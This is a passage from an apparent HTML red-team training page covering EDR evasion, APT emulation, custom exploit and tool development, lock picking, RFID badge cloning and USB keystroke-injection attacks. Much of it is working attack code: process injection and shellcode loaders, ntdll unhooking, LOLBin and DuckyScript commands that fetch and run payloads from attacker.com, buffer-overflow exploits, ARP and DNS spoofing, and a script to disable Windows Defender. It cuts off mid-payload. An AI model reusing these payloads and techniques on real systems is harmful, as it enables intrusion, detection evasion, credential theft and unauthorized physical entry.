# 4. Process Injection
# Inject into legitimate process

# C# example:
// Open target process
Process target = Process.GetProcessesByName("notepad")[0];
IntPtr procHandle = OpenProcess(0x1F0FFF, false, target.Id);

// Allocate memory in target
IntPtr addr = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length, 0x3000, 0x40);

// Write shellcode
WriteProcessMemory(procHandle, addr, shellcode, shellcode.Length, out _);

// Create thread
CreateRemoteThread(procHandle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

# Shellcode now running inside notepad.exe!
# EDR sees: notepad.exe (looks normal)

# 5. Sleep Obfuscation
# EDR scans sleeping processes
# Solution: Encrypt beacon while sleeping

# Sliver feature:
sliver (BEACON) > sleep-obfuscation

# Beacon encrypts itself before sleep
# Decrypts on wakeup
# EDR memory scan finds encrypted gibberish!

# 6. Unhooking
# EDR "hooks" Windows APIs to monitor calls
# Remove hooks before executing malicious code

# C# example (unhook NTDLL):
// Read fresh ntdll.dll from disk
byte[] ntdllBytes = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");

// Overwrite hooked ntdll in memory
// Now EDR can't monitor our syscalls!

# 7. Direct Syscalls
# Bypass EDR hooks entirely by calling kernel directly

# Example (x64 assembly for NtAllocateVirtualMemory):
mov r10, rcx
mov eax, 0x18  # Syscall number
syscall
ret

# No userland API calls ‚Üí EDR can't see it!

# 8. Living Off The Land (LOLBins)
# Use legitimate Windows tools for malicious purposes

# Download file without PowerShell:
certutil -urlcache -split -f http://attacker.com/payload.exe C:\ProgramData\payload.exe

# Or:
bitsadmin /transfer myDownload http://attacker.com/payload.exe C:\ProgramData\payload.exe

# Execute payload:
rundll32.exe C:\ProgramData\payload.dll,EntryPoint

# EDR sees: "certutil.exe ran" (normal Windows tool!)

# 9. Shellcode Loaders
# Custom loader that executes shellcode

# Golang loader (cross-platform, hard to reverse):
package main
import (
    "syscall"
    "unsafe"
)

func main() {
    shellcode := []byte{0x90, 0x90, ...}  // Your shellcode
    
    addr, _, _ := syscall.Syscall(syscall.VirtualAlloc, 4,
        0, uintptr(len(shellcode)), 0x3000, 0x40)
    
    syscall.Syscall(syscall.RtlCopyMemory, 3,
        addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    
    syscall.Syscall(addr, 0, 0, 0, 0)
}

# Compile:
GOOS=windows go build -ldflags="-s -w" loader.go

# No suspicious imports, custom loader, harder to detect!</div>

            <h3>Part 5: APT Emulation</h3>

            <div class="code"># APT = Advanced Persistent Threat (nation-state hackers)

# Framework: MITRE ATT&CK
# https://attack.mitre.org/

# APT28 (Fancy Bear, Russia) TTPs:

# Initial Access:
# - Spearphishing (T1566)
# - Watering hole attacks (T1189)

# Execution:
# - PowerShell (T1059.001)
# - WMI (T1047)

# Persistence:
# - Registry Run Keys (T1547.001)
# - Scheduled Tasks (T1053.005)

# Privilege Escalation:
# - Bypass UAC (T1548.002)
# - Exploit vulnerability (T1068)

# Defense Evasion:
# - Obfuscated Files (T1027)
# - Process Injection (T1055)

# Credential Access:
# - LSASS Memory Dump (T1003.001)
# - Credential from Registry (T1003.002)

# Discovery:
# - Network Service Scanning (T1046)
# - Domain Trust Discovery (T1482)

# Lateral Movement:
# - Remote Desktop Protocol (T1021.001)
# - Windows Admin Shares (T1021.002)

# Collection:
# - Archive Collected Data (T1560)
# - Email Collection (T1114)

# Exfiltration:
# - Exfiltration Over C2 Channel (T1041)

# Emulating APT28 red team exercise:

# Day 1: Initial Access
# Send spearphishing email with malicious Word doc
# (Contains macro that downloads Covenant beacon)

# Day 2: Establish Foothold
# Beacon calls home
# Execute post-exploitation:
#   - Dump credentials (Mimikatz)
#   - Establish persistence (WMI subscription)
#   - Enumerate domain (PowerView)

# Day 3: Lateral Movement
# Found domain admin credentials
# Move to Domain Controller via WMI:
wmic /node:DC01 /user:admin /password:pass process call create "rundll32.exe C:\ProgramData\beacon.dll,Start"

# Day 4: Domain Dominance
# Dump krbtgt hash (DCSync)
# Create Golden Ticket
# Now persistent access for years!

# Day 5: Exfiltration
# Exfiltrate data slowly (100MB/day)
# Use DNS tunneling to avoid detection
# Encrypt data before exfil

# Day 6: Cover Tracks
# Clear logs
# Remove obvious persistence (keep WMI subscription)
# Document findings for report

# Tools for APT emulation:

# Atomic Red Team (automated TTPs):
git clone https://github.com/redcanaryco/atomic-red-team.git
cd atomic-red-team
Invoke-AtomicTest T1003.001  # LSASS dump

# Caldera (autonomous red team):
git clone https://github.com/mitre/caldera.git
cd caldera
python3 server.py --insecure

# Access: http://localhost:8888
# Creates automated adversary that emulates APT campaigns!

# Mythic (multi-platform C2):
# Supports Windows, Linux, macOS
# Plugin-based architecture
# Customizable profiles for different APTs</div>

            <div class="metaphor-box">
                <h4>üéâ You're a Red Team Operator!</h4>
                <p>You've mastered:<br><br>
                ‚úÖ <strong>C2 Frameworks:</strong> Covenant, Sliver, listener setup, payload generation, session management<br>
                ‚úÖ <strong>OPSEC:</strong> Infrastructure isolation, domain fronting, traffic obfuscation, attribution evasion<br>
                ‚úÖ <strong>Persistence:</strong> Registry keys, scheduled tasks, WMI subscriptions, Golden Tickets, Skeleton Key<br>
                ‚úÖ <strong>Evasion:</strong> AMSI bypass, in-memory execution, process injection, unhooking, direct syscalls<br>
                ‚úÖ <strong>APT Emulation:</strong> MITRE ATT&CK, real-world TTPs, phased operations<br><br>
                <strong>Red Team Engagement Phases:</strong><br>
                1. <strong>Planning:</strong> Define objectives, rules of engagement, OPSEC plan<br>
                2. <strong>Initial Access:</strong> Phishing, exploit, physical access<br>
                3. <strong>Establish Foothold:</strong> C2 callback, persistence, credential dumping<br>
                4. <strong>Escalate Privileges:</strong> Local admin ‚Üí Domain admin<br>
                5. <strong>Lateral Movement:</strong> Spread to high-value targets<br>
                6. <strong>Achieve Objectives:</strong> Exfiltrate data, plant flags, test detection<br>
                7. <strong>Cover Tracks:</strong> Remove obvious indicators, keep subtle backdoors<br>
                8. <strong>Report:</strong> Document TTPs used, detection gaps, remediation advice<br><br>
                <strong>Career paths:</strong><br>
                ‚Ä¢ Red Team Operator (offensive security)<br>
                ‚Ä¢ Purple Team (red team + blue team collaboration)<br>
                ‚Ä¢ Threat Intelligence (understanding APT TTPs)<br>
                ‚Ä¢ Security Researcher (finding new evasion techniques)<br><br>
                You now think like a nation-state hacker. Use this power responsibly! üé≠üöÄ</p>
            </div>
        </section>

        <!-- SECTION 9: Custom Tool Development -->
        <section id="custom-tools" class="section">
            <h2 class="section-title">Custom Tool Development</h2>
            <p class="section-intro">Off-the-shelf tools are great, but they have limitations: detected by AV, lack specific features you need, or don't fit your workflow. The ultimate hacker skill: building your own tools! This section teaches Python exploit development, Scapy packet manipulation, custom scanner creation, automation scripts, and tool integration. You'll learn to build port scanners, vulnerability scanners, exploit frameworks, credential harvesters, and anything else you can imagine. By the end, you'll never be limited by existing tools again!</p>

            <div class="metaphor-box">
                <h4>üí° Custom Tools = Your Hacking Superpower</h4>
                <p><strong>Why build custom tools?</strong><br><br>
                ‚Ä¢ <strong>Stealth:</strong> AV doesn't have signatures for YOUR code<br>
                ‚Ä¢ <strong>Flexibility:</strong> Add features tailored to your target<br>
                ‚Ä¢ <strong>Speed:</strong> Automate repetitive tasks<br>
                ‚Ä¢ <strong>Learning:</strong> Understand tools by rebuilding them<br>
                ‚Ä¢ <strong>Integration:</strong> Connect tools that don't normally work together<br><br>
                <strong>Real-world examples:</strong><br>
                ‚Ä¢ Metasploit started as HD Moore's custom scanner<br>
                ‚Ä¢ Burp Suite started as PortSwigger's custom proxy<br>
                ‚Ä¢ Nmap started as Fyodor's custom port scanner<br><br>
                Every major tool started as someone's custom script! üöÄ</p>
            </div>

            <h3>Part 1: Python Exploit Development</h3>

            <div class="code"># Python is THE language for exploit development:
# ‚Ä¢ Easy to learn, fast to prototype<br>
# ‚Ä¢ Rich library ecosystem (sockets, HTTP, crypto)<br>
# ‚Ä¢ Platform-independent<br>
# ‚Ä¢ Integration with other tools

# Basic exploit template:

from pwn import *  # pwntools library

# Target configuration
host = '192.168.1.100'
port = 9999

# Connect to target
r = remote(host, port)

# Receive banner
banner = r.recvuntil(b'>')
log.info(f"Banner: {banner}")

# Build exploit payload
offset = 112  # Buffer overflow offset
eip_value = p32(0x41414141)  # Return address
shellcode = asm(shellcraft.linux.sh())  # Generate shellcode

payload = b'A' * offset
payload += eip_value
payload += shellcode

# Send exploit
log.info("Sending payload...")
r.send(payload)

# Interact with shell
r.interactive()

# Example: Buffer overflow exploit for vulnerable server

from socket import *
from struct import pack

target_ip = '192.168.1.100'
target_port = 9999

# Bad characters to avoid (nullbytes, newlines, etc.)
bad_chars = b'\x00\x0a\x0d'

# msfvenom generated shellcode (reverse shell)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# NOP sled (\x90 = NOP instruction)
nops = b'\x90' * 16

# Return address (JMP ESP address from binary)
ret_addr = pack('<I', 0x625011af)  # Little-endian

# Build payload
buffer_size = 524
padding = buffer_size - len(shellcode) - len(nops)

exploit = nops + shellcode
exploit += b'A' * padding
exploit += ret_addr

# Send exploit
sock = socket(AF_INET, SOCK_STREAM)
sock.connect((target_ip, target_port))
sock.send(exploit)
sock.close()

print("[+] Exploit sent! Check listener for shell.")

# Advanced: Format string exploit

# Vulnerable code:
# printf(user_input);  // No format specifier!

# Exploitation:
payload = b"%x." * 20  # Leak stack values
# Or:
payload = b"%s%s%s%s"  # Crash (read from invalid addresses)
# Or:
payload = b"%n"  # Write to memory!

# Example format string exploit:
target_addr = 0x08049000  # GOT entry to overwrite
shellcode_addr = 0xbffff000

# Write shellcode_addr to target_addr:
payload = p32(target_addr)
payload += b"%" + str(shellcode_addr - 4).encode() + b"x"
payload += b"%n"

# This overwrites GOT entry with our shellcode address!

# Heap overflow exploit:

# Vulnerable code:
# char *buf1 = malloc(100);
# char *buf2 = malloc(100);
# strcpy(buf1, user_input);  // No bounds check!

# Exploitation (unlink attack):
# Overwrite heap metadata to write shellcode address to GOT

payload = b'A' * 100  # Fill first chunk
payload += p32(0xffffffff)  # Size field (prevent coalescing)
payload += p32(0x0804a000)  # FD (forward pointer)
payload += p32(0x0804a004)  # BK (backward pointer)
# When free() is called, FD->BK = BK and BK->FD = FD
# This writes to arbitrary memory!</div>

            <h3>Part 2: Scapy - Packet Manipulation Master</h3>

            <div class="code"># Scapy = Python library for network packet manipulation

from scapy.all import *

# Install:
# pip3 install scapy

# Basic packet creation:
pkt = IP(dst="192.168.1.1")/ICMP()
send(pkt)

# Or with reply:
reply = sr1(pkt)
print(reply.show())

# TCP SYN scan (like nmap):

def syn_scan(target, ports):
    open_ports = []
    for port in ports:
        pkt = IP(dst=target)/TCP(dport=port, flags='S')
        reply = sr1(pkt, timeout=1, verbose=0)
        
        if reply and reply.haslayer(TCP):
            if reply[TCP].flags == 'SA':  # SYN-ACK = open
                open_ports.append(port)
                # Send RST to close connection cleanly
                rst = IP(dst=target)/TCP(dport=port, flags='R')
                send(rst, verbose=0)
    
    return open_ports

result = syn_scan('192.168.1.100', range(1, 1025))
print(f"Open ports: {result}")

# ARP spoofing (MITM attack):

def arp_spoof(target_ip, gateway_ip):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    
    # Tell target: "I am the gateway"
    arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                     psrc=gateway_ip)
    
    # Tell gateway: "I am the target"
    arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                      psrc=target_ip)
    
    while True:
        send(arp_target, verbose=0)
        send(arp_gateway, verbose=0)
        time.sleep(2)

# Usage:
# arp_spoof('192.168.1.10', '192.168.1.1')
# Now all traffic from .10 routes through you!

# DNS spoofing:

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):  # DNS query
        qname = pkt[DNSQR].qname.decode()
        
        if 'bank.com' in qname:
            # Forge DNS response
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                         UDP(dport=pkt[UDP].sport, sport=53)/\
                         DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                             an=DNSRR(rrname=qname, ttl=10, rdata='10.0.0.5'))
            send(spoofed_pkt, verbose=0)
            print(f"[+] Spoofed DNS for {qname} ‚Üí 10.0.0.5")

sniff(filter="udp port 53", prn=dns_spoof)

# Custom protocol fuzzing:

def fuzz_protocol(target, port):
    payloads = [
        b'A' * 100,
        b'A' * 1000,
        b'A' * 10000,
        b'%s%s%s%s',
        b'\xff\xff\xff\xff',
        b'\x00' * 100,
    ]
    
    for payload in payloads:
        try:
            pkt = IP(dst=target)/TCP(dport=port)/Raw(load=payload)
            reply = sr1(pkt, timeout=2, verbose=0)
            
            if not reply:
                print(f"[!] No reply for payload: {payload[:20]}...")
            elif reply.haslayer(TCP) and reply[TCP].flags == 'R':
                print(f"[!] Connection reset: {payload[:20]}...")
            else:
                print(f"[+] Normal response: {payload[:20]}...")
        except Exception as e:
            print(f"[!] Error: {e}")

# Packet sniffing with filtering:

def packet_callback(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        load = pkt[Raw].load
        
        # Look for credentials
        if b'password' in load.lower() or b'user' in load.lower():
            print(f"[!] Possible credentials:")
            print(f"    Source: {pkt[IP].src}:{pkt[TCP].sport}")
            print(f"    Dest: {pkt[IP].dst}:{pkt[TCP].dport}")
            print(f"    Data: {load[:100]}")

sniff(prn=packet_callback, filter="tcp", store=0)

# Generate malformed packets:

# Malformed TCP (conflicting flags):
weird_pkt = IP(dst='192.168.1.100')/TCP(flags='SFPURAE')  # All flags!
send(weird_pkt)

# Malformed IP (invalid header length):
weird_ip = IP(dst='192.168.1.100', ihl=2)/ICMP()  # ihl should be >= 5
send(weird_ip)

# Land attack (same src/dst):
land = IP(src='192.168.1.100', dst='192.168.1.100')/TCP(sport=139, dport=139, flags='S')
send(land)  # Some systems crash!

# Ping of death:
ping_of_death = fragment(IP(dst='192.168.1.100')/ICMP()/('X'*60000))
send(ping_of_death)  # Fragments > 65535 bytes</div>

            <h3>Part 3: Building a Custom Vulnerability Scanner</h3>

            <div class="code"># Let's build a multi-threaded vulnerability scanner!

import socket
import threading
import queue
from concurrent.futures import ThreadPoolExecutor

class VulnScanner:
    def __init__(self, target, threads=10):
        self.target = target
        self.threads = threads
        self.results = []
    
    def check_sql_injection(self, url):
        """Test for SQL injection"""
        payloads = ["'", '"', '1=1', "' OR '1'='1", '" OR "1"="1']
        
        for payload in payloads:
            test_url = f"{url}?id={payload}"
            try:
                response = requests.get(test_url, timeout=5)
                
                # Check for SQL errors
                errors = ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql']
                for error in errors:
                    if error in response.text.lower():
                        return f"[!] SQL Injection found: {test_url}"
            except:
                pass
        return None
    
    def check_xss(self, url):
        """Test for XSS"""
        payload = "<script>alert('XSS')</script>"
        test_url = f"{url}?q={payload}"
        
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                return f"[!] XSS found: {test_url}"
        except:
            pass
        return None
    
    def check_open_redirect(self, url):
        """Test for open redirect"""
        payload = "http://evil.com"
        test_url = f"{url}?redirect={payload}"
        
        try:
            response = requests.get(test_url, allow_redirects=False, timeout=5)
            if response.status_code in [301, 302]:
                location = response.headers.get('Location', '')
                if payload in location:
                    return f"[!] Open redirect found: {test_url}"
        except:
            pass
        return None
    
    def check_lfi(self, url):
        """Test for Local File Inclusion"""
        payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "C:\\Windows\\win.ini"
        ]
        
        for payload in payloads:
            test_url = f"{url}?file={payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if 'root:' in response.text or '[extensions]' in response.text:
                    return f"[!] LFI found: {test_url}"
            except:
                pass
        return None
    
    def check_ssrf(self, url):
        """Test for Server-Side Request Forgery"""
        # Use Burp Collaborator or similar
        payload = "http://169.254.169.254/latest/meta-data/"  # AWS metadata
        test_url = f"{url}?url={payload}"
        
        try:
            response = requests.get(test_url, timeout=5)
            if 'ami-id' in response.text or 'instance-id' in response.text:
                return f"[!] SSRF found (AWS metadata): {test_url}"
        except:
            pass
        return None
    
    def scan(self, url):
        """Run all checks"""
        checks = [
            self.check_sql_injection,
            self.check_xss,
            self.check_open_redirect,
            self.check_lfi,
            self.check_ssrf
        ]
        
        for check in checks:
            result = check(url)
            if result:
                self.results.append(result)
    
    def run(self, urls):
        """Scan multiple URLs with threading"""
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.scan, urls)
        
        return self.results

# Usage:
scanner = VulnScanner('example.com', threads=20)
urls = [
    'http://example.com/page1.php',
    'http://example.com/page2.php',
    'http://example.com/admin.php'
]

results = scanner.run(urls)
for result in results:
    print(result)

# Enhanced port scanner with service detection:

import socket
import sys
from datetime import datetime

class AdvancedScanner:
    def __init__(self, target):
        self.target = target
        self.open_ports = {}
    
    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            
            if result == 0:
                service = self.grab_banner(sock, port)
                self.open_ports[port] = service
            
            sock.close()
        except Exception as e:
            pass
    
    def grab_banner(self, sock, port):
        try:
            # Try to get banner
            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            return banner.split('\n')[0] if banner else 'Unknown'
        except:
            # Use common port mapping
            services = {
                21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
                53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
                443: 'HTTPS', 445: 'SMB', 3306: 'MySQL', 3389: 'RDP',
                5432: 'PostgreSQL', 6379: 'Redis', 8080: 'HTTP-Proxy',
                27017: 'MongoDB'
            }
            return services.get(port, 'Unknown')
    
    def scan_range(self, start_port, end_port):
        print(f"[*] Scanning {self.target} from port {start_port} to {end_port}")
        print(f"[*] Started at {datetime.now()}")
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(self.scan_port, range(start_port, end_port + 1))
        
        print(f"[*] Finished at {datetime.now()}")
        print(f"\n[+] Open ports:")
        for port, service in sorted(self.open_ports.items()):
            print(f"    {port}/tcp    {service}")

# Usage:
scanner = AdvancedScanner('192.168.1.100')
scanner.scan_range(1, 1000)</div>

            <div class="metaphor-box">
                <h4>üéâ You're a Tool Builder!</h4>
                <p>You've mastered:<br><br>
                ‚úÖ <strong>Python Exploits:</strong> Buffer overflows, format strings, heap exploits, shellcode integration<br>
                ‚úÖ <strong>Scapy:</strong> Packet crafting, ARP spoofing, DNS spoofing, protocol fuzzing, custom scans<br>
                ‚úÖ <strong>Custom Scanners:</strong> Multi-threaded scanning, vuln detection, service enumeration<br><br>
                <strong>Tool ideas to build:</strong><br>
                ‚Ä¢ Subdomain enumeration tool<br>
                ‚Ä¢ Credential stuffing tool<br>
                ‚Ä¢ Custom C2 framework<br>
                ‚Ä¢ Automated phishing framework<br>
                ‚Ä¢ WiFi deauth tool<br>
                ‚Ä¢ Ransomware PoC (for research!)<br>
                ‚Ä¢ Keylogger<br>
                ‚Ä¢ Browser password extractor<br><br>
                The only limit is your imagination! Every tool you build makes you more powerful. üõ†Ô∏èüöÄ</p>
            </div>
        </section>

        <!-- SECTION 10: Physical Security & Social Engineering -->
        <section id="physical-security" class="section">
            <h2 class="section-title">Physical Security & Social Engineering</h2>
            <p class="section-intro">The human element is always the weakest link. You can have perfect firewalls, encrypted disks, and multi-factor authentication‚Äîbut if someone tailgates through the door or plugs in a USB Rubber Ducky, game over! Physical security attacks bypass technical controls entirely. This section covers lock picking, badge cloning (RFID/NFC), USB attack platforms (Rubber Ducky, Bash Bunny, O.MG Cable), social engineering tactics, phishing campaigns, pretexting, and physical penetration testing methodology. By the end, you'll understand how hackers walk through front doors!</p>

            <div class="metaphor-box">
                <h4>üí° Physical Security = The Front Door Hack</h4>
                <p><strong>Why physical attacks work:</strong><br><br>
                ‚Ä¢ <strong>Bypass network defenses:</strong> No firewall stops a person walking in<br>
                ‚Ä¢ <strong>Direct access:</strong> Physical = root/admin by definition<br>
                ‚Ä¢ <strong>Social trust:</strong> Humans trust confident people with badges<br>
                ‚Ä¢ <strong>Low detection:</strong> No IDS alerts when picking a lock<br><br>
                <strong>Famous physical hacks:</strong><br>
                ‚Ä¢ <strong>2011 RSA breach:</strong> Started with spear-phishing USB drive left in parking lot<br>
                ‚Ä¢ <strong>Stuxnet:</strong> USB worm infected air-gapped Iranian nuclear facility<br>
                ‚Ä¢ <strong>Social engineering:</strong> Kevin Mitnick never needed to code‚Äîhe just called people<br><br>
                Physical security testing finds the holes that digital audits miss! üö™üîê</p>
            </div>

            <h3>Part 1: Lock Picking Fundamentals</h3>

            <div class="info-box">
                <h4>How Locks Work (Pin Tumbler)</h4>
                <p><strong>Basic mechanism:</strong><br>
                ‚Ä¢ <strong>Pins:</strong> Spring-loaded pins inside lock (usually 5-6 pins)<br>
                ‚Ä¢ <strong>Shear line:</strong> Boundary between plug and housing<br>
                ‚Ä¢ <strong>Key:</strong> Raises pins to correct height ‚Üí all pins at shear line ‚Üí plug rotates<br><br>
                <strong>Without correct key:</strong><br>
                Pins block plug from rotating<br><br>
                <strong>With correct key:</strong><br>
                All pins align at shear line ‚Üí plug rotates ‚Üí lock opens<br><br>
                <strong>Lock picking principle:</strong><br>
                Apply slight rotational tension ‚Üí Pins bind at different rates ‚Üí Set pins one by one ‚Üí All pins set ‚Üí Lock opens!</p>
            </div>

            <div class="code"># Lock Picking Tools:

# 1. Tension Wrench (most important!)
# Applies rotational force to plug
# Types:
#   - L-shaped (classic)
#   - Z-shaped (fits different keyways)
#   - Flat (bottom-of-keyway)

# 2. Pick (manipulates pins)
# Types:
#   - Hook pick (single pin picking)
#   - Rake (multiple pins simultaneously)
#   - Diamond pick (versatile)
#   - Half-diamond (better control)

# 3. Specialized Tools:
#   - Broken key extractor
#   - Decoder (reads pin heights)
#   - Plug spinner (reverses plug)
#   - Bump key (mechanical exploit)
#   - Snap gun (mechanical vibration)

# Single Pin Picking (SPP) Technique:

# Step 1: Insert tension wrench
# Place in bottom or top of keyway
# Apply LIGHT rotational pressure (like turning a key)
# Too much = pins bind (can't move)
# Too little = pins don't set

# Step 2: Insert pick above tension wrench
# Feel for pins (little bumps inside lock)
# There should be 5-6 pins

# Step 3: Push each pin up
# One pin will be "binding" (harder to push)
# This is the first pin to set
# Push binding pin until you feel/hear a click
# Plug will rotate slightly

# Step 4: Repeat for remaining pins
# New pin will bind
# Set it
# Continue until all pins set
# Plug rotates fully ‚Üí lock opens!

# Raking Technique (faster, less precise):

# Step 1: Insert tension wrench (light pressure)

# Step 2: Insert rake pick
# Scrub rake in and out rapidly
# Pins bounce up and down
# Some will randomly land at shear line

# Step 3: Increase tension gradually
# As pins set, increase rotational force
# Lock may open after 10-30 seconds of raking

# Practice locks:
# ‚Ä¢ Clear acrylic practice locks (see pins moving!)
# ‚Ä¢ Master Lock #3 (beginner lock)
# ‚Ä¢ Kwikset deadbolts (common residential)
# ‚Ä¢ Schlage pins (medium difficulty)
# ‚Ä¢ Medeco locks (advanced, security pins)

# Legal Note:
# Lock picking is LEGAL in most jurisdictions if:
#   - You own the lock, OR
#   - You have written permission, OR
#   - You're a locksmith
# 
# ILLEGAL if:
#   - You possess picks with intent to commit crime
#   - You pick locks you don't own without permission
#
# Check your local laws!</div>

            <h4>Bypassing Locks (Without Picking)</h4>

            <div class="code"># Lock bypasses are faster than picking!

# 1. Bumping
# Uses specially cut "bump key"
# Exploits pin inertia

# How it works:
# - Insert bump key (cut to lowest depth on all positions)
# - Pull out one click
# - Apply light rotational tension
# - Strike key with hammer/screwdriver
# - All pins jump simultaneously
# - Brief moment where all pins at shear line
# - Plug rotates ‚Üí lock opens!

# Success rate: 90%+ on pin tumbler locks
# Time: 5-30 seconds
# Noise: Moderate (bump sound)

# 2. Shimming (Padlocks)
# Thin metal strip defeats locking mechanism

# Step 1: Cut soda can into thin strip
# Step 2: Insert between shackle and body
# Step 3: Push down on shackle
# Step 4: Shim slides past locking pawl
# Step 5: Padlock opens!

# Works on: Cheap padlocks (Master Lock, etc.)
# Doesn't work on: Higher-security padlocks with ball bearings

# 3. Impressioning
# Create working key from blank

# Step 1: Insert blank key
# Step 2: Apply heavy rotational force
# Step 3: Pins leave marks on blank
# Step 4: File down marked areas
# Step 5: Repeat until key works

# Time: 30 minutes to 2 hours
# Skill: Advanced
# Result: Working key!

# 4. Bypass Tools
# ‚Ä¢ Under-door tool (reaches inside, unlocks from interior)
# ‚Ä¢ Latch slipping (credit card trick on spring latches)
# ‚Ä¢ Emergency exit exploitation (push bars can be manipulated)

# 5. Destructive Entry (last resort)
# ‚Ä¢ Drilling (destroy pins)
# ‚Ä¢ Snapping (Euro-cylinder vulnerability)
# ‚Ä¢ Prying (force shackle/bolt)
# ‚Ä¢ Cutting (angle grinder, bolt cutters)</div>

            <h3>Part 2: RFID/NFC Badge Cloning</h3>

            <div class="code"># Many buildings use RFID/NFC badges for access control
# Problem: Most use 125kHz HID Prox or 13.56MHz Mifare
# Solution: Clone badges with $40 device!

# Hardware: Proxmark3 (professional) or Flipper Zero (portable)

# Proxmark3 Setup:
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3
make clean && make all

# Connect Proxmark3 via USB
./pm3

# Proxmark3 console starts:
[=] Session log /root/.proxmark3/logs/log_20260108.txt
[+] loaded from JSON file /root/.proxmark3/preferences.json

# Identify card type:
proxmark3> lf search

# Output (125kHz HID Prox):
[+] HID Prox TAG ID: 2006e11e (8838) - Format Len: 26 bit - FC: 100 - Card: 1822

# Clone to T5577 writable card:
proxmark3> lf hid clone 2006e11e

# Output:
[=] Cloning tag with ID 2006e11e
[=] Done

# Test cloned card:
proxmark3> lf hid read

# Should show same ID!

# 13.56MHz Mifare Classic:
proxmark3> hf search

# Output:
[+] UID: 01 02 03 04
[+] ATQA: 00 04
[+] SAK: 08 [2]
[+] Mifare Classic 1K

# Check for default keys:
proxmark3> hf mf chk *1 ?

# Output:
[+] Sector 0, key type A, key: FFFFFFFFFFFF (default)
[+] Sector 1, key type A, key: FFFFFFFFFFFF
[... 90% of cards still use default keys! ...]

# Dump card:
proxmark3> hf mf dump

# Creates: hf-mf-01020304-dump.bin

# Clone to blank Mifare card:
proxmark3> hf mf restore

# Select: hf-mf-01020304-dump.bin
# Clone complete!

# NFC credit card reading:
proxmark3> hf 14a info

# Output (contactless credit card):
[+] UID: AA BB CC DD
[+] ATQA: 00 04
[+] SAK: 20 [3]
[+] TYPE: NXP MIFARE DESFire

# Read card data:
proxmark3> hf 14a reader

# Some cards expose:
# - Card number (PAN)
# - Expiry date
# - Cardholder name
# - Transaction history

# Note: Can't extract CVV (stored on magnetic stripe only)

# Flipper Zero (Portable Alternative):

# Read 125kHz badge:
# RFID ‚Üí Read ‚Üí [Hold badge to device]
# ‚Üí Save as "Office_Badge"

# Emulate badge:
# RFID ‚Üí Saved ‚Üí Office_Badge ‚Üí Emulate
# [Hold Flipper to reader]
# ‚Üí Door unlocks!

# Read 13.56MHz card:
# NFC ‚Üí Read ‚Üí [Hold card to device]
# ‚Üí Shows UID and data

# Emulate card:
# NFC ‚Üí Saved ‚Üí [Select card] ‚Üí Emulate

# Defense Against Badge Cloning:
# ‚Ä¢ Use high-frequency encrypted cards (iCLASS SE, Seos)
# ‚Ä¢ Implement two-factor (badge + PIN)
# ‚Ä¢ RFID-blocking sleeves
# ‚Ä¢ Monitor for duplicate badge usage
# ‚Ä¢ Short-range readers (require very close proximity)</div>

            <h3>Part 3: USB Attack Platforms</h3>

            <h4>USB Rubber Ducky</h4>

            <div class="code"># USB Rubber Ducky = Keystroke injection tool
# Looks like USB flash drive
# Acts like USB keyboard
# Types commands VERY fast (1000 characters/second!)

# Hardware: https://shop.hak5.org/products/usb-rubber-ducky

# Programming Language: DuckyScript

# Example Payload (Windows):

# File: payload.txt

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
ENTER

# Explanation:
# DELAY 1000        ‚Üí Wait 1 second (for system to recognize USB)
# GUI r             ‚Üí Open Run dialog (Windows key + R)
# DELAY 500         ‚Üí Wait for dialog to appear
# STRING ...        ‚Üí Type PowerShell command
# ENTER             ‚Üí Execute command

# This downloads and runs payload from attacker server!

# More DuckyScript commands:

# REM Comment
# Used for documentation

# DELAY milliseconds
DELAY 2000  # Wait 2 seconds

# STRING text
STRING Hello World  # Types: Hello World

# ENTER, SPACE, TAB, ESCAPE
ENTER

# GUI (Windows key), CTRL, ALT, SHIFT
GUI
CTRL a
ALT F4

# Function keys
F1
F12

# REPEAT n
REPEAT 5
STRING Hello
ENTER
END_REPEAT

# Examples:

# 1. Reverse Shell Payload (Windows):
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/shell.ps1')"
ENTER

# 2. Disable Windows Defender:
DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs
DELAY 2000
ENTER
DELAY 3000
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
DELAY 500
STRING exit
ENTER

# 3. Exfiltrate Chrome Passwords (Windows):
DELAY 1000
GUI r
DELAY 500
